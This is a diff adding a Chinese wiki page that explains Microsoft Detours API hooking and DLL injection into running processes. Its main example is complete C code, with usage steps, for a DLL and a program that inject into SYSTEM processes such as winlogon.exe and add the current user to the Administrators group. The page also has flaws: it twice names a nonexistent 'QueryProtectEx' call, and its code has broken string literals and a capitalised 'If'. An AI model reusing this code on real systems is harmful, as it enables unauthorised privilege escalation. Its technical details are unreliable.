@@ -1,0 +1,260 @@
+#summary One-sentence summary of this page.
+#labels Detours
+
+= Introduction =
+
+Search Detours in Google.
+
+
+= Details =
+
+---- Detours是微软开发的一个函数库（源代码可在http://research.microsoft.com/sn/detours 免费获得）, 用于修改运行中的程序在内存中的影像，从而即使没有源代码也能改变程序的行为。具体用途是： 
+
+拦截WIN32 API调用，将其引导到自己的子程序，从而实现WIN32 API的定制。 
+为一个已在运行的进程创建一新线程，装入自己的代码并运行。 
+---- 本文将简介Detours的原理，Detours库函数的用法， 并利用Detours库函数在Windows NT上编写了一个程序，该程序能使有“调试程序”的用户权限的用户成为系统管理员，附录利用Detours库函数修改该程序使普通用户即可成为系统管理员（在NT4 SP3上）。 
+
+一． Detours的原理 
+
+---- 1． WIN32进程的内存管理 
+
+---- 总所周知，WINDOWS NT实现了虚拟存储器，每一WIN32进程拥有4GB的虚存空间， 关于WIN32进程的虚存结构及其操作的具体细节请参阅WIN32 API手册， 以下仅指出与Detours相关的几点： 
+
+---- (1) 进程要执行的指令也放在虚存空间中 
+---- (2) 可以使用QueryProtectEx函数把存放指令的页面的权限更改为可读可写可执行，再改写其内容，从而修改正在运行的程序 
+---- (3) 可以使用VirtualAllocEx从一个进程为另一正运行的进程分配虚存，再使用 QueryProtectEx函数把页面的权限更改为可读可写可执行，并把要执行的指令以二进制机器码的形式写入，从而为一个正在运行的进程注入任意的代码 
+
+---- 2． 拦截WIN32 API的原理 
+
+---- Detours定义了三个概念： 
+
+---- (1) Target函数：要拦截的函数，通常为Windows的API。 
+---- (2) Trampoline函数：Target函数的复制品。因为Detours将会改写Target函数，所以先把Target函数复制保存好，一方面仍然保存Target函数的过程调用语义，另一方面便于以后的恢复。 
+---- (3) Detour 函数：用来替代Target函数的函数。 
+
+---- Detours在Target函数的开头加入JMP Address_of_ Detour_ Function指令（共5个字节）把对Target函数的调用引导到自己的Detour函数， 把Target函数的开头的5个字节加上JMP Address_of_ Target _ Function+5作为Trampoline函数。例子如下： 
+
+拦截前：Target _ Function：
+   ；Target函数入口，以下为假想的常见的子程序入口代码
+   push   ebp
+   mov   ebp,   esp
+   push   eax
+   push   ebx
+   Trampoline:
+   ；以下是Target函数的继续部分
+   ……
+
+拦截后： Target _ Function：
+   jmp   Detour_Function
+   Trampoline:
+   ；以下是Target函数的继续部分
+   ……
+
+   Trampoline_Function:
+   ; Trampoline函数入口, 开头的5个字节与Target函数相同
+   push   ebp
+   mov   ebp,   esp
+   push   eax
+   push   ebx
+   ；跳回去继续执行Target函数
+   jmp   Target_Function+5
+---- 3． 为一个已在运行的进程装入一个DLL 
+
+---- 以下是其步骤： 
+
+---- (1) 创建一个ThreadFuction，内容仅是调用LoadLibrary。 
+---- (2) 用VirtualAllocEx为一个已在运行的进程分配一片虚存，并把权限更改为可读可写可执行。 
+---- (3) 把ThreadFuction的二进制机器码写入这片虚存。 
+---- (4) 用CreateRemoteThread在该进程上创建一个线程，传入前面分配的虚存的起始地址作为线程函数的地址，即可为一个已在运行的进程装入一个DLL。通过DllMain 即可在一个已在运行的进程中运行自己的代码。 
+
+二． Detours库函数的用法 
+
+---- 因为Detours软件包并没有附带帮助文件，以下接口仅从剖析源代码得出。 
+
+---- 1． PBYTE WINAPI DetourFindFunction(PCHAR pszModule, PCHAR pszFunction) 
+
+---- 功能：从一DLL中找出一函数的入口地址 
+---- 参数：pszModule是DLL名，pszFunction是函数名。 
+---- 返回：名为pszModule的DLL的名为pszFunction的函数的入口地址 
+---- 说明：DetourFindFunction除使用GetProcAddress外，还直接分析DLL的文件头，因此可以找到一些GetProcAddress找不到的函数入口。 
+
+---- 2． DETOUR_TRAMPOLINE(trampoline_prototype, target_name) 
+---- 功能：该宏把名为target_name 的Target函数生成Trampoline函数，以后调用 trampoline_prototype在语义上等于调用Target函数。 
+
+---- 3． BOOL WINAPI DetourFunctionWithTrampoline(PBYTE pbTrampoline, BYTE pbDetour) 
+---- 功能：用Detour 函数拦截Target函数 
+---- 参数：pbTrampoline是DETOUR_TRAMPOLINE得到的trampoline_prototype，pbDetour是 Detour 函数的入口地址。 
+
+---- 4． BOOL WINAPI DetourRemoveWithTrampoline(PBYTE pbTrampoline,PBYTE pbDetour) 
+---- 功能：恢复Target函数 
+---- 参数：pbTrampoline是DETOUR_TRAMPOLINE得到的trampoline_prototype，pbDetour是 Detour 函数的入口地址。 
+
+---- 5． BOOL WINAPI ContinueProcessWithDll(HANDLE hProcess, LPCSTR lpDllName) 
+---- 功能：为一个已在运行的进程装入一个DLL 
+---- 参数：hProcess是进程的句柄，lpDllName是要装入的DLL名 
+
+三． 程序实例 
+
+---- 以一个能使有“调试程序”的用户权限的用户成为系统管理员的程序做例子说明Detours 库函数的用法。程序的设计思路是找一个以System帐号运行的进程，如spoolss.exe, rpcss.exe, winlogon.exe, service.exe等，使用ContinueProcessWithDll在其中注入把当前用户加入到 Administrators本地组的DLL，因为该DLL在这些进程的安全上下文环境运行，所以有相应的权限。 
+
+---- 先编写相应的DLL： 
+
+/*admin.dll, 当进程装入时会把名为szAccountName
+   的用户加入到Administrators本地组。*/
+
+#include 
+#include 
+#include 
+#include 
+
+/*以下创建一共享段实现进程间的数据通讯，
+   szAccountName 是用户名，bPrepared说明
+   szAccountName是否已初始化。*/
+
+#pragma data_seg(".MYSHARE")
+BOOL bPrepared=FALSE;
+wchar_t szAccountName[100]={0};
+#pragma data_seg()
+
+#pragma comment(linker, "/SECTION:.MYSHARE,RWS")
+
+/*程序调用SetAccountName设置要加入到Administrators
+   本地组的用户名，并通知DllMain
+   已初始化szAccountName ，
+   以后被装入时可调用ElevatePriv */
+
+__declspec(dllexport) VOID WINAPI
+   SetAccountName(wchar_t *Name)
+{
+wcscpy(szAccountName,Name);
+bPrepared=TRUE;
+}
+
+/*把名为szAccountName的用户加入
+   到Administrators本地组*/
+
+__declspec(dllexport) VOID WINAPI ElevatePriv()
+{
+LOCALGROUP_MEMBERS_INFO_3 account;
+account.lgrmi3_domainandname=szAccountName;
+NetLocalGroupAddMembers(NULL,L"Administrators",
+3,(LPBYTE)&account,1);
+}
+
+__declspec(dllexport) ULONG WINAPI
+DllMain(HINSTANCE hInstance, 
+DWORD dwReason, PVOID lpReserved)
+{
+switch (dwReason) {
+   case DLL_THREAD_ATTACH:
+   if (bPrepared)
+     ElevatePriv();
+}
+return TRUE;
+} 
+
+程序如下：
+
+/*AddMeToAdministrators.exe 把当前用户加入到
+   Administrators本地组。使用方法为：（1）
+---- 运行任务管理器找到spoolss.exe或rpcss.exe或winlogon.exe或sevice.exe的进程ID （2）执行AddMeToAdministrators.exe procid, 其中procid为（1）记下的进程ID （3）签退再签到，运行用户管理器，即可发现自己已在Administrators本地组中。*/ 
+
+#include 
+#include 
+#include 
+#include 
+#include 
+
+extern VOID WINAPI SetAccountName(wchar_t *Name);
+
+/* GetCurrentUser得到自己的用户名称*/
+
+void GetCurrentUser(wchar_t *szName)
+{
+   HANDLE hProcess, hAccessToken;
+   wchar_t InfoBuffer[1000],szAccountName[200],
+   szDomainName[200];
+   PTOKEN_USER pTokenUser = (PTOKEN_USER)InfoBuffer;
+   DWORD dwInfoBufferSize,dwAccountSize = 200,
+   dwDomainSize = 200;
+   SID_NAME_USE snu;
+
+   hProcess = GetCurrentProcess();
+
+   OpenProcessToken(hProcess,TOKEN_READ,&hAccessToken);
+
+   GetTokenInformation(hAccessToken,TokenUser,
+   InfoBuffer,
+       1000, &dwInfoBufferSize);
+
+   LookupAccountSid(NULL, pTokenUser->User.Sid,
+   szAccountName,
+       &dwAccountSize,szDomainName, &dwDomainSize, &snu);
+   wcscpy(szName,szDomainName); 
+   wcscat(szName,L"\");
+   wcscat(szName,szAccountName);
+}
+
+/* EnablePrivilege启用自己的“调试程序”的用户权限*/
+
+BOOL EnablePrivilege(LPCTSTR szPrivName,BOOL fEnable) 
+{
+HANDLE hToken;
+if (!OpenProcessToken(GetCurrentProcess(), 
+             TOKEN_ADJUST_PRIVILEGES, &hToken)) 
+   return FALSE;
+TOKEN_PRIVILEGES tp;
+tp.PrivilegeCount = 1;
+LookupPrivilegeValue(NULL, szPrivName,
+&tp.Privileges[0].Luid);
+tp.Privileges[0].Attributes = fEnable ?
+SE_PRIVILEGE_ENABLED : 0;
+AdjustTokenPrivileges(hToken, FALSE, &tp,
+sizeof(tp), NULL, NULL);
+return((GetLastError() == ERROR_SUCCESS));
+}
+
+int WINAPI WinMain(HINSTANCE hinst, HINSTANCE hprev,
+LPSTR lpszCmdLine, int 
+nCmdShow)
+{
+INT argc;
+WCHAR **argv;
+argv = CommandLineToArgvW(GetCommandLineW(),
+&argc);
+INT nProcessId = -1;
+if (argc!=2){
+   wprintf(L"usage %s pid", argv[0]);
+   return 1;
+}
+nProcessId = _wtoi(argv[1]);
+printf("%d ",nProcessId);
+---- /*要成功执行ContinueProcessWithDll，要对winlogon.exe等进程的进程句柄有读写存储器内容和创建线程的权限，EnablePrivilege使本进程有这样的权利。*/ 
+
+if (!EnablePrivilege(SE_DEBUG_NAME, TRUE)){
+   printf("AdjustTokenPrivilege Fail %u ",
+(UINT)GetLastError());
+   return 1;
+}
+HANDLE   gNewHandle = 
+OpenProcess(PROCESS_ALL_ACCESS
+, TRUE, nProcessId); 
+if (!gNewHandle){
+   printf("OpenProcess Fail %u ",
+(UINT)GetLastError());
+   return 1;
+}
+   wchar_t szName[100];
+GetCurrentUser(szName);
+SetAccountName(szName);
+If (!ContinueProcessWithDll(gNewHandle,
+L"c:\temp\admin.dll")) {
+   printf("ContinueProcessWithDll failed %u",
+(UINT)GetLastError());
+   return 3;
+}
+return 0;
+}
+---- 因为“调试程序”的用户权限缺省情况下仅赋予给管理员，因此并不会造成安全漏洞。但该程序揭示出“调试程序”的用户权限其实是至高无上的用户权限，只能授予给可信用户。 
+
+四． 结论 ---- Detours是一强大的工具，提供了简单易用的函数接口来拦截WIN32 API调用和为一个已在运行的进程装入一个DLL。
